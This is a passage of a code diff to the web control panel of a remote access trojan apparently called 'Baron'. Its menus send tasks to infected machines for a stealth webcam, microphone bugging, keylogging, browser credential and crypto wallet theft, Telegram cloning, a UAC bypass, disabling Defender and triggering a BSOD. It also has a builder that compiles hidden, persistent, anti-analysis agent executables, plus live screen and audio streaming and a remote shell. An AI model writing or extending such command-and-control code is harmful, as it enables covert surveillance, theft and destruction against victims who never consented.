+                <div class="cm-item" onclick="cmd('screen_start')"><i class="fa-solid fa-desktop"></i> Watch Screen</div>
+                <div class="cm-item" onclick="cmd('webcam')"><i class="fa-solid fa-video"></i> Stealth Webcam</div>
+                <div class="cm-item" onclick="cmd('audio_start')"><i class="fa-solid fa-microphone"></i> Bug Microphone</div>
+                <div class="cm-item" onclick="cmd('keylogger')"><i class="fa-solid fa-keyboard"></i> Get Keystrokes</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title">Data Extraction</div>
+                <div class="cm-item" onclick="cmd('steal_browsers')"><i class="fa-brands fa-chrome"></i> Dump Browsers</div>
+                <div class="cm-item" onclick="cmd('steal_crypto')"><i class="fa-brands fa-bitcoin"></i> Find Wallets</div>
+                <div class="cm-item" onclick="cmd('steal_telegram')"><i class="fa-brands fa-telegram"></i> Clone Telegram</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title">System & Execution</div>
+                <div class="cm-item" onclick="cmd('uac')"><i class="fa-solid fa-shield-halved"></i> UAC Fodhelper</div>
+                <div class="cm-item" onclick="cmd('proxy')"><i class="fa-solid fa-server"></i> Reverse Proxy</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title" style="color:var(--danger)">Destructive</div>
+                <div class="cm-item danger" onclick="cmd('bsod')"><i class="fa-solid fa-skull"></i> Trigger BSOD</div>
+                <div class="cm-item danger" onclick="cmd('kill_defender')"><i class="fa-solid fa-radiation"></i> Nuke Defender</div>
+                <div class="cm-item danger" onclick="cmd('uninstall')"><i class="fa-solid fa-trash"></i> Melt & Uninstall</div>
+            </div>
+        </div>
+
     </div>
-    <div id="modal-body"></div>
-  </div>
-</div>
 
-<script>
-const API = '';
-let TOKEN = localStorage.getItem('bt') || '';
-let SESSION = null;
-let CLIENTS = {};
-let SELECTED_CID = null;
-let BUILD_DATA = null;
-let socket = null;
+    <!-- ----------------------------------------------------------------------------------
+         CORE JAVASCRIPT ENGINE (Three.js, Socket.IO, WindowManager)
+    ----------------------------------------------------------------------------------- -->
+    <script>
+        // --- 1. State & Globals ---
+        let token = localStorage.getItem('baron_token');
+        let socket = null;
+        let selectedClient = null;
 
-// ── Clock
-setInterval(() => {
-  document.getElementById('clock').textContent = new Date().toLocaleTimeString('ru-RU');
-}, 1000);
-
-// ── Init
-if (TOKEN) init();
-
-async function doLogin() {
-  const u = document.getElementById('u').value.trim();
-  const p = document.getElementById('p').value;
-  const btn = document.getElementById('loginBtn');
-  btn.textContent = '…'; btn.disabled = true;
-  const r = await fetch('/api/panel/login', {
-    method: 'POST', headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({login:u, password:p})
-  }).catch(() => null);
-  btn.textContent = 'AUTHORIZE ›'; btn.disabled = false;
-  if (!r) return err('Connection failed');
-  const d = await r.json();
-  if (d.ok) { TOKEN = d.token; SESSION = d; localStorage.setItem('bt', TOKEN); init(); }
-  else err(d.error || 'Auth failed');
-}
-
-function err(m) { document.getElementById('loginErr').textContent = m; }
-
-function init() {
-  const l = document.getElementById('login');
-  l.style.opacity = '0'; l.style.pointerEvents = 'none';
-  setTimeout(() => l.style.display = 'none', 700);
-  document.getElementById('shell').style.display = 'grid';
-  if (SESSION) showUser(SESSION);
-  else checkSession();
-  fetchAll();
-  setInterval(fetchAll, 8000);
-  initSocket();
-}
-
-async function checkSession() {
-  const r = await apiFetch('/api/panel/check');
-  if (r && r.ok) { SESSION = r; showUser(r); }
-  else { logout(); }
-}
-
-function showUser(s) {
-  document.getElementById('usr-name').textContent = s.user || '?';
-  document.getElementById('usr-role').textContent = s.admin ? 'Administrator' : 'Operator';
-  document.getElementById('usr-av').textContent = (s.user||'?')[0].toUpperCase();
-}
-
-// ── Theming & Sovereign Island
-const savedTheme = localStorage.getItem('baron-theme');
-if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
-
-function setTheme(name, e) {
-  if (e) e.stopPropagation();
-  document.documentElement.setAttribute('data-theme', name);
-  localStorage.setItem('baron-theme', name);
-}
-
-let islandTid = null;
-function toggleIsland() {
-  const isl = document.getElementById('sv-island');
-  if(!isl) return;
-  isl.classList.toggle('expanded');
-  if (isl.classList.contains('expanded')) {
-     clearTimeout(islandTid);
-     islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 5000);
-  }
-}
-
-function islandNotify(msg, color) {
-  const isl = document.getElementById('sv-island');
-  const ic = document.getElementById('isl-center');
-  if(!isl || !ic) return;
-  ic.innerHTML = `<span style="color:${color||'var(--gold)'}">${msg}</span>`;
-  isl.classList.add('expanded');
-  clearTimeout(islandTid);
-  islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 4000);
-}
-
-setInterval(() => {
-  const c = document.getElementById('clock');
-  if(c) c.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
-}, 1000);
-
-function logout() {
-  fetch('/api/panel/logout', {method:'POST', headers:{'X-Token':TOKEN}});
-  localStorage.removeItem('bt'); TOKEN = ''; SESSION = null;
-  location.reload();
-}
-
-async function apiFetch(url, opts = {}) {
-  opts.headers = opts.headers || {};
-  opts.headers['X-Token'] = TOKEN;
-  const r = await fetch(url, opts).catch(() => null);
-  if (!r) return null;
-  if (r.status === 401) { logout(); return null; }
-  return r.json().catch(() => null);
-}
-
-async function fetchAll() {
-  const d = await apiFetch('/api/panel/clients');
-  if (!d || !d.ok) return;
-  CLIENTS = d.clients || {};
-  renderStats(d);
-  renderClientTable();
-  renderAgentTable();
-  populateStreamSelect();
-}
-
-function renderStats(d) {
-  const clients = Object.values(CLIENTS);
-  const online = clients.filter(c => (Date.now()/1000 - (c.last_seen||0)) < 300).length;
-  document.getElementById('s-total').textContent = clients.length;
-  document.getElementById('s-online').textContent = online;
-  document.getElementById('s-tasks').textContent = d.tasks || 0;
-  const up = d.uptime || 0;
-  const h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
-  document.getElementById('s-uptime').textContent = h ? `${h}h` : `${m}m`;
-  document.getElementById('badge-online').textContent = `${online} online`;
-  renderLogs(d.logs || []);
-}
-
-function timeSince(ts) {
-  if (!ts) return '—';
-  const s = Math.floor(Date.now()/1000 - ts);
-  if (s < 60) return `${s}s ago`;
-  if (s < 3600) return `${Math.floor(s/60)}m ago`;
-  return `${Math.floor(s/3600)}h ago`;
-}
-
-function isOnline(c) { return (Date.now()/1000 - (c.last_seen||0)) < 300; }
-
-function clientRow(cid, c, cols) {
-  const on = isOnline(c);
-  const pill = on
-    ? '<span class="pill pill-green"><span class="pill-dot"></span>Online</span>'
-    : '<span class="pill pill-red"><span class="pill-dot"></span>Offline</span>';
-  
-  const trStart = `<tr oncontextmenu="showContextMenu(event, '${cid}')" style="cursor:context-menu">`;
-  
-  if (cols === 7) {
-    return `${trStart}
-      <td class="cid">${cid.substring(0,12)}…</td>
-      <td>${c.hostname||'—'}</td>
-      <td>${(c.os||'').substring(0,30)}</td>
-      <td>${c.internal_ip||c.ip||'—'}</td>
-      <td>${pill}</td>
-      <td>${timeSince(c.last_seen)}</td>
-      <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
-    </tr>`;
-  }
-  return `${trStart}
-    <td class="cid">${cid.substring(0,12)}…</td>
-    <td>${c.hostname||'—'}</td>
-    <td>${(c.os||'').substring(0,25)}</td>
-    <td>${c.user||'—'}</td>
-    <td>${c.internal_ip||c.ip||'—'}</td>
-    <td>${c.country||'—'}</td>
-    <td>${c.av||'—'}</td>
-    <td>${pill}</td>
-    <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
-  </tr>`;
-}
-
-function renderClientTable() {
-  const tb = document.getElementById('client-table');
-  const keys = Object.keys(CLIENTS);
-  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 7)).join('') :
-    '<tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr>';
-}
-
-function renderAgentTable() {
-  const tb = document.getElementById('agent-table');
-  const keys = Object.keys(CLIENTS);
-  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 9)).join('') :
-    '<tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr>';
-}
-
-function renderLogs(logs) {
-  const el = document.getElementById('log-body');
-  if (!el) return;
-  
-  const latest = logs[logs.length - 1];
-  if(latest && latest.time > (window.lastLogTime||0)) {
-     window.lastLogTime = latest.time;
-     if(!window.initialLogsLoad) { window.initialLogsLoad=true; }
-     else { islandNotify(latest.msg, latest.level === 'error' ? 'var(--red)' : (latest.level==='warn'?'#febc2e':'var(--gold)')); }
-  }
-
-  el.innerHTML = [...logs].reverse().slice(0, 80).map(l => {
-    const t = l.time ? new Date(l.time*1000).toLocaleTimeString() : '';
-    const cls = l.level === 'warn' ? 'log-warn' : l.level === 'error' ? 'log-error' : 'log-info';
-    return `<div class="log-entry ${cls}"><span class="log-time">${t}</span><span class="log-msg">${l.msg}</span></div>`;
-  }).join('') || '<div style="color:var(--text-dim);text-align:center;padding:32px">No logs</div>';
-}
-
-async function fetchLogs() {
-  const d = await apiFetch('/api/panel/clients');
-  if (d && d.ok) renderLogs(d.logs || []);
-}
-
-function populateStreamSelect() {
-  const sel = document.getElementById('stream-cid');
-  const prev = sel.value;
-  sel.innerHTML = '<option value="">— Select Agent —</option>';
-  Object.entries(CLIENTS).forEach(([k, c]) => {
-    const o = document.createElement('option');
-    o.value = k; o.textContent = `${c.hostname||k.substring(0,8)} (${isOnline(c)?'Online':'Offline'})`;
-    sel.appendChild(o);
-  });
-  if (prev) sel.value = prev;
-}
-
-// ── Agent Control Modal
-function openAgent(cid) {
-  SELECTED_CID = cid;
-  const c = CLIENTS[cid] || {};
-  document.getElementById('modal-title').textContent = `Control: ${c.hostname||cid.substring(0,12)}`;
-  document.getElementById('modal-body').innerHTML = `
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px">
-      <div style="font-size:.78rem;color:var(--text-dim)">OS: <b style="color:var(--text)">${c.os||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">User: <b style="color:var(--text)">${c.user||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">IP: <b style="color:var(--text)">${c.ip||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">Last: <b style="color:var(--text)">${timeSince(c.last_seen)}</b></div>
-    </div>
-    <div class="terminal">
-      <div class="term-bar">
-        <div class="term-dot" style="background:#ff5f57"></div>
-        <div class="term-dot" style="background:#febc2e"></div>
-        <div class="term-dot" style="background:#28c840"></div>
-        <span style="margin-left:8px;font-size:.72rem;color:var(--text-dim)">Shell · ${c.hostname||'agent'}</span>
-      </div>
-      <div class="term-body" id="agent-out" style="height:200px"></div>
-      <div class="term-inp-row">
-        <span class="term-prompt">baron@${c.hostname||'host'}&gt;&nbsp;</span>
-        <input class="term-inp" id="agent-cmd" placeholder="shell command…" onkeydown="if(event.key==='Enter')sendCmd()">
-        <button class="btn btn-gold btn-sm" onclick="sendCmd()">Run</button>
-      </div>
-    </div>
-    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:16px">
-      <button class="btn btn-outline btn-sm" onclick="cmd('info')">SysInfo</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('browsers')">Browser Creds</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('persist_install')">Persist</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('netscan')">NetScan</button>
-      <button class="btn btn-red btn-sm" onclick="cmd('kill')">Kill</button>
-    </div>
-  `;
-  showModal();
-  loadResults();
-}
-
-async function sendCmd() {
-  const inp = document.getElementById('agent-cmd');
-  const c = inp.value.trim(); if (!c) return;
-  inp.value = '';
-  appendOut(document.getElementById('agent-out'), `> ${c}`, '#aaaaaa');
-  await sendCommand({action:'exec', cmd: c});
-}
-
-async function cmd(action) {
-  await sendCommand({action});
-}
-
-async function sendCommand(payload) {
-  if (!SELECTED_CID) return;
-  const r = await apiFetch('/api/panel/command', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({cid: SELECTED_CID, cmd: payload})
-  });
-  if (r && r.ok) appendOut(document.getElementById('agent-out'), `[Sent: ${payload.action}]`, '#5b9fff');
-  
-  if (['screen_start', 'webcam_start', 'audio_start'].includes(payload.action)) {
-    document.getElementById('stream-cid').value = SELECTED_CID;
-    nav(document.querySelector('[data-page="streams"]'), 'streams');
-  }
-}
-
-// ── Context Menu
-function showContextMenu(e, cid) {
-  e.preventDefault();
-  SELECTED_CID = cid;
-  const menu = document.getElementById('ctx-menu');
-  document.getElementById('ctx-target').textContent = (CLIENTS[cid]?.hostname || cid).substring(0, 16);
-  menu.classList.add('show');
-  
-  let x = e.clientX;
-  let y = e.clientY;
-  const mx = window.innerWidth - menu.offsetWidth - 10;
-  const my = window.innerHeight - menu.offsetHeight - 10;
-  if(x > mx) x = mx;
-  if(y > my) y = my;
-  menu.style.left = x + 'px';
-  menu.style.top = y + 'px';
-}
-
-function hideCtx() {
-  document.getElementById('ctx-menu').classList.remove('show');
-}
-document.addEventListener('click', hideCtx);
-document.addEventListener('contextmenu', (e) => {
-  if(!e.target.closest('tr')) hideCtx();
-});
-
-async function ctxCmd(action) {
-  hideCtx();
-  if(!SELECTED_CID) return;
-  await sendCommand({action});
-}
-
-
-function appendOut(el, text, color='#a0f0a0') {
-  if (!el) return;
-  const line = document.createElement('div');
-  line.style.color = color; line.textContent = text;
-  el.appendChild(line);
-  el.scrollTop = el.scrollHeight;
-}
-
-async function loadResults() {
-  if (!SELECTED_CID) return;
-  const d = await apiFetch(`/api/panel/results?cid=${SELECTED_CID}`);
-  if (!d || !d.ok) return;
-  const el = document.getElementById('agent-out');
-  if (!el) return;
-  (d.results || []).slice(-20).forEach(r => {
-    appendOut(el, `[${r.type||'?'}] ${JSON.stringify(r.data||'').substring(0,200)}`, '#c0f0c0');
-  });
-}
-
-// ── Streams
-function sendStream(action) {
-  const cid = document.getElementById('stream-cid').value;
-  if (!cid) return alert('Select an agent first');
-  SELECTED_CID = cid;
-  sendCommand({action});
-}
-
-// ── Files
-async function listFiles() {
-  const cid = SELECTED_CID || Object.keys(CLIENTS)[0];
-  if (!cid) return;
-  const path = document.getElementById('file-path').value || 'C:\\';
-  SELECTED_CID = cid;
-  await sendCommand({action:'filelist', path});
-  document.getElementById('file-out').textContent = 'Command sent. Waiting for agent response…';
-}
-
-// ── Builder
-async function buildAgent() {
-  const opts = {
-    server: document.getElementById('b-server').value,
-    name: document.getElementById('b-name').value,
-    beacon: parseInt(document.getElementById('b-beacon').value) || 5000,
-    output_type: document.getElementById('b-type').value,
-    hidden: document.getElementById('b-hidden').checked,
-    persist: document.getElementById('b-persist').checked,
-    anti_kill: document.getElementById('b-antikill').checked,
-    disable_defender: document.getElementById('b-defender').checked,
-    fake_error: document.getElementById('b-fakeerr').checked,
-    anti_analysis: document.getElementById('b-antianalysis').checked,
-    debug: document.getElementById('b-debug').checked,
-  };
-  if (!opts.server) return alert('C2 Server URL required');
-  const r = await apiFetch('/api/panel/build', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify(opts)
-  });
-  if (!r) return;
-  const out = document.getElementById('build-out');
-  const src = document.getElementById('build-src');
-  out.style.display = 'block';
-  if (r.ok) {
-    BUILD_DATA = r;
-    let header = '';
-    if (r.compile_status === 'success') {
-      header = '✅ COMPILED SUCCESSFULLY\n📥 Download: ' + r.download_url + '\n\n';
-    } else if (r.compile_status === 'failed') {
-      header = '❌ COMPILATION FAILED: ' + (r.compile_error || 'Unknown error') + '\n📄 Source code returned below:\n\n';
-    } else {
-      header = '⚠ No compiler on server. Source code (.cs) returned:\n\n';
-    }
-    src.textContent = header + (r.source || '');
-  } else {
-    src.textContent = 'Error: ' + (r.error || 'Unknown');
-  }
-}
-
-function clearBuildOut() {
-  document.getElementById('build-out').style.display = 'none';
-  document.getElementById('build-src').textContent = '';
-  BUILD_DATA = null;
-}
-
-async function downloadBuild() {
-  if (!BUILD_DATA) return;
-  if (BUILD_DATA.download_url) {
-    // Download compiled .exe via fetch with auth token
-    try {
-      const resp = await fetch(BUILD_DATA.download_url, {
-        headers: {'X-Token': TOKEN}
-      });
-      if (!resp.ok) { alert('Download failed: ' + resp.status); return; }
-      const blob = await resp.blob();
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = (BUILD_DATA.name||'agent') + '.exe';
-      a.click();
-      URL.revokeObjectURL(a.href);
-    } catch(e) { alert('Download error: ' + e); }
-  } else {
-    // Download .cs source
-    const blob = new Blob([BUILD_DATA.source || ''], {type:'text/plain'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob); a.download = (BUILD_DATA.name||'agent') + '.cs'; a.click();
-  }
-}
-
-
-// ── Socket.IO
-function initSocket() {
-  try {
-    socket = io({auth:{token:TOKEN}});
-    socket.emit('auth', {token:TOKEN});
-    
-    let audioCtx = null;
-    
-    socket.on('stream_frame', d => {
-      if (d.type === 'screen') {
-          const el = document.getElementById('screen-frame');
-          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
-      } else if (d.type === 'webcam') {
-          const el = document.getElementById('webcam-frame');
-          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
-      }
-    });
-    
-    socket.on('audio_chunk', async d => {
-      try {
-        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        if(audioCtx.state === 'suspended') await audioCtx.resume();
-        const binary = atob(d.data); const len = binary.length; const bytes = new Uint8Array(len);
-        for (let i=0; i<len; i++) bytes[i] = binary.charCodeAt(i);
-        const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
-        const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
-      } catch(e) { console.error("Audio play error", e); }
-    });
-
-    socket.on('result', d => {
-      const el = document.getElementById('agent-out');
-      if (el && d.cid === SELECTED_CID) appendOut(el, `[${d.type}] ${JSON.stringify(d.data||'').substring(0,300)}`);
-    });
-  } catch(e) {}
-}
-
-// ── Navigation
-function nav(el, page) {
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  el.classList.add('active');
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(`page-${page}`).classList.add('active');
-  document.getElementById('pg-title').textContent = el.textContent.trim();
-  if (page === 'logs') fetchLogs();
-}
-
-// ── Modal
-function showModal() { document.getElementById('modal-overlay').classList.add('show'); }
-function closeModal() { document.getElementById('modal-overlay').classList.remove('show'); SELECTED_CID = null; }
-
-// ── Enter to login
-document.querySelectorAll('#u,#p').forEach(el => el.addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); }));
-
-// ── Drag & Drop (Masonry Modular Layout)
-document.addEventListener('DOMContentLoaded', () => {
-  const statsContainer = document.querySelector('.stats-grid');
-  if(statsContainer) {
-    let draggedItem = null;
-    let savedOrder = null;
-    try { savedOrder = JSON.parse(localStorage.getItem('baron-stats-order')); }catch(e){}
-    
-    // Restore order if saved
-    if(savedOrder && Array.isArray(savedOrder)) {
-      const stats = [...statsContainer.querySelectorAll('.stat')];
-      savedOrder.forEach(id => {
-        const el = stats.find(s => s.querySelector('.stat-val') && s.querySelector('.stat-val').id === id);
-        if(el) statsContainer.appendChild(el);
-      });
-    }
-
-    statsContainer.querySelectorAll('.stat').forEach(stat => {
-      stat.setAttribute('draggable', true);
-      stat.addEventListener('dragstart', function(e) {
-        draggedItem = this;
-        setTimeout(() => this.style.opacity = '0.4', 0);
-      });
-      stat.addEventListener('dragend', function() {
-        setTimeout(() => {
-          this.style.opacity = '1';
-          draggedItem = null;
-          // save order
-          const newOrder = [...statsContainer.querySelectorAll('.stat-val')].map(el => el.id);
-          localStorage.setItem('baron-stats-order', JSON.stringify(newOrder));
-        }, 0);
-      });
-      stat.addEventListener('dragover', e => e.preventDefault());
-      stat.addEventListener('dragenter', function(e) { e.preventDefault(); this.style.transform = 'scale(1.05)'; });
-      stat.addEventListener('dragleave', function() { this.style.transform = ''; });
-      stat.addEventListener('drop', function() {
-        this.style.transform = '';
-        if (draggedItem && this !== draggedItem) {
-          let all = [...statsContainer.querySelectorAll('.stat')];
-          let draggedIdx = all.indexOf(draggedItem);
-          let droppedIdx = all.indexOf(this);
-          if(draggedIdx < droppedIdx) this.parentNode.insertBefore(draggedItem, this.nextSibling);
-          else this.parentNode.insertBefore(draggedItem, this);
+        // --- 2. Window Manager (Spatial UI) ---
+        class WindowManager {
+            constructor() {
+                this.windows = document.querySelectorAll('.os-window');
+                this.zIndex = 500;
+                
+                // Init dragging
+                this.windows.forEach(win => {
+                    const header = win.querySelector('.win-header');
+                    win.addEventListener('mousedown', () => this.focus(win.id));
+                    
+                    let isDragging = false, startX, startY, initX, initY;
+                    
+                    header.addEventListener('mousedown', e => {
+                        if(e.target.classList.contains('win-btn')) return;
+                        isDragging = true;
+                        startX = e.clientX; startY = e.clientY;
+                        const rect = win.getBoundingClientRect();
+                        initX = rect.left; initY = rect.top;
+                        win.style.transition = 'none'; // Disable transition while dragging
+                    });
+                    
+                    document.addEventListener('mousemove', e => {
+                        if(!isDragging) return;
+                        const dx = e.clientX - startX;
+                        const dy = e.clientY - startY;
+                        win.style.left = `${initX + dx}px`;
+                        win.style.top = `${initY + dy}px`;
+                    });
+                    
+                    document.addEventListener('mouseup', () => {
+                        if(isDragging) {
+                            isDragging = false;
+                            win.style.transition = 'transform 0.2s, opacity 0.2s, box-shadow 0.2s';
+                        }
+                    });
+                });
+            }
+            
+            focus(id) {
+                this.windows.forEach(w => w.classList.remove('focus'));
+                const win = document.getElementById(id);
+                if(win) {
+                    win.style.display = 'flex';
+                    win.classList.add('focus');
+                    win.style.zIndex = ++this.zIndex;
+                }
+                
+                // Update Dock Active
+                document.querySelectorAll('.dock-item').forEach(i => i.classList.remove('active'));
+                const mapper = { 'win-clients':0, 'win-builder':1, 'win-logs':2, 'win-settings':3, 'win-admin':4, 'win-changelog':5 };
+                if(mapper[id]!==undefined) {
+                    document.querySelectorAll('.dock-item')[mapper[id]].classList.add('active');
+                }
+            }
+            
+            open(id) {
+                const win = document.getElementById(id);
+                if(win) {
+                    win.style.display = 'flex';
+                    this.focus(id);
+                }
+            }
+            
+            close(id) {
+                const win = document.getElementById(id);
+                if(win) win.style.display = 'none';
+            }
+            
+            maximize(id) {
+                const win = document.getElementById(id);
+                if(!win) return;
+                if(win.dataset.max == "1") {
+                    win.style.width = win.dataset.ow;
+                    win.style.height = win.dataset.oh;
+                    win.style.top = win.dataset.oy;
+                    win.style.left = win.dataset.ox;
+                    win.dataset.max = "0";
+                } else {
+                    win.dataset.ow = win.style.width || getComputedStyle(win).width;
+                    win.dataset.oh = win.style.height || getComputedStyle(win).height;
+                    win.dataset.ox = win.style.left || getComputedStyle(win).left;
+                    win.dataset.oy = win.style.top || getComputedStyle(win).top;
+                    win.style.width = '100vw'; win.style.height = '100vh';
+                    win.style.top = '0'; win.style.left = '0';
+                    win.dataset.max = "1";
+                }
+            }
+            
+            minimize(id) { this.close(id); }
         }
-      });
-    });
-  }
-});
+        const wm = new WindowManager();
 
-</script>
+        // --- 3. Context Menu Logic ---
+        const ctxMenu = document.getElementById('context-menu');
+        document.addEventListener('click', () => { ctxMenu.classList.remove('active'); });
+        
+        function attachContextMenu() {
+            const rows = document.querySelectorAll('#clients-body tr');
+            rows.forEach(row => {
+                row.addEventListener('contextmenu', e => {
+                    e.preventDefault();
+                    if(row.children[0].textContent === 'No connected agents') return;
+                    
+                    selectedClient = row.dataset.id;
+                    
+                    // Position menu
+                    ctxMenu.style.left = `${e.clientX}px`;
+                    ctxMenu.style.top = `${e.clientY}px`;
+                    
+                    // Prevent overflow
+                    const rect = ctxMenu.getBoundingClientRect();
+                    if(e.clientX + rect.width > window.innerWidth) ctxMenu.style.left = `${window.innerWidth - rect.width - 10}px`;
+                    if(e.clientY + rect.height > window.innerHeight) ctxMenu.style.top = `${window.innerHeight - rect.height - 10}px`;
+                    
+                    ctxMenu.classList.add('active');
+                });
+            });
+        }
+
+        function cmd(action) {
+            if(!selectedClient) return;
+            logTerminal(`Executing <${action}> on ${selectedClient}...`, 'sys');
+            fetch('/api/panel/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ id: selectedClient, action: action })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) logTerminal(`Task queued successfully.`, 'succ');
+                else logTerminal(`Failed: ${data.error}`, 'err');
+            });
+        }
+
+        function adminAction(action) {
+            if(!confirm(`Are you sure you want to execute [${action}]? This action might be destructive.`)) return;
+            logTerminal(`Executing Admin Action: ${action}`, 'warn');
+            fetch('/api/panel/admin_action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ action: action })
+            })
+            .then(r => r.json())
+            .then(d => {
+                if(d.ok) logTerminal(`[${action}] Executed successfully`, 'succ');
+                else logTerminal(`[${action}] Failed: ${d.error}`, 'err');
+            });
+        }
+
+        // --- 4. Theming ---
+        function setTheme(thm) {
+            document.documentElement.setAttribute('data-theme', thm);
+            localStorage.setItem('baron_theme', thm);
+            // Re-init 3D line colors based on theme accent
+            let c = '#D4AF37';
+            if(thm==='sapphire') c='#2f80ed';
+            if(thm==='ruby') c='#ff4757';
+            if(thm==='emerald') c='#2ed573';
+            if(thm==='amethyst') c='#9b59b6';
+            if(window.globeMaterial) window.globeMaterial.color.set(c);
+        }
+        const savedTheme = localStorage.getItem('baron_theme') || 'gold';
+        setTheme(savedTheme);
+
+
+        // --- 5. Three.js Background Engine (Cyber Globe) ---
+        function init3D() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.getElementById('canvas-container').appendChild(renderer.domElement);
+
+            // Create Wireframe Globe
+            const geometry = new THREE.IcosahedronGeometry(10, 2);
+            // Get color from CSS variable
+            const style = getComputedStyle(document.body);
+            const accent = style.getPropertyValue('--accent').trim() || '#D4AF37';
+            
+            const material = new THREE.MeshBasicMaterial({ 
+                color: accent, 
+                wireframe: true,
+                transparent: true,
+                opacity: 0.15
+            });
+            window.globeMaterial = material; // expose for theme changes
+            
+            const globe = new THREE.Mesh(geometry, material);
+            scene.add(globe);
+
+            // Add particles
+            const pGeo = new THREE.BufferGeometry();
+            const pCount = 500;
+            const pArray = new Float32Array(pCount * 3);
+            for(let i=0; i<pCount*3; i++) {
+                pArray[i] = (Math.random() - 0.5) * 50;
+            }
+            pGeo.setAttribute('position', new THREE.BufferAttribute(pArray, 3));
+            const pMat = new THREE.PointsMaterial({ size: 0.05, color: '#ffffff', transparent: true, opacity: 0.3 });
+            const particles = new THREE.Points(pGeo, pMat);
+            scene.add(particles);
+
+            camera.position.z = 20;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                globe.rotation.y += 0.001;
+                globe.rotation.x += 0.0005;
+                particles.rotation.y -= 0.0005;
+                
+                // Slow breathing effect on mouse move (Parallax)
+                camera.position.x += (mouseX * 0.5 - camera.position.x) * 0.05;
+                camera.position.y += (-mouseY * 0.5 - camera.position.y) * 0.05;
+                camera.lookAt(scene.position);
+                
+                renderer.render(scene, camera);
+            }
+            
+            let mouseX = 0, mouseY = 0;
+            document.addEventListener('mousemove', e => {
+                mouseX = (e.clientX / window.innerWidth) * 2 - 1;
+                mouseY = (e.clientY / window.innerHeight) * 2 - 1;
+            });
+            
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+            
+            animate();
+        }
+        init3D();
+
+        // --- 6. Core Logic (Auth & Socket) ---
+        const authScreen = document.getElementById('auth-screen');
+        const workspace = document.getElementById('workspace');
+
+        function logTerminal(msg, type='info') {
+            const term = document.getElementById('terminal');
+            const d = new Date();
+            const time = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
+            term.innerHTML += `<div class="log-line"><span class="log-time">[${time}]</span> <span class="log-${type}">${msg}</span></div>`;
+            term.scrollTop = term.scrollHeight;
+        }
+
+        // Setup Login event
+        document.getElementById('btn-login').addEventListener('click', () => {
+            const l = document.getElementById('login-user').value;
+            const p = document.getElementById('login-pass').value;
+            
+            if(!l || !p) return;
+            
+            fetch('/api/panel/login', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login: l, password: p })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) {
+                    token = data.token;
+                    localStorage.setItem('baron_token', token);
+                    enterWorkspace();
+                } else {
+                    document.getElementById('auth-error').innerText = data.error;
+                    const card = document.querySelector('.auth-card');
+                    card.style.transform = "translateX(5px)"; setTimeout(()=>card.style.transform="translateX(-5px)",50); setTimeout(()=>card.style.transform="translateX(0)",100);
+                }
+            }).catch(e => {
+                document.getElementById('auth-error').innerText = "Network Error";
+            });
+        });
+
+        document.getElementById('login-pass').addEventListener('keypress', e => { if(e.key==='Enter') document.getElementById('btn-login').click(); });
+
+        function enterWorkspace() {
+            authScreen.style.opacity = '0';
+            setTimeout(() => {
+                authScreen.style.visibility = 'hidden';
+                workspace.style.display = 'block';
+                setTimeout(() => workspace.style.opacity = '1', 50);
+                initSocket();
+                fetchClients(); // Initial fetch
+            }, 800);
+        }
+
+        function logout() {
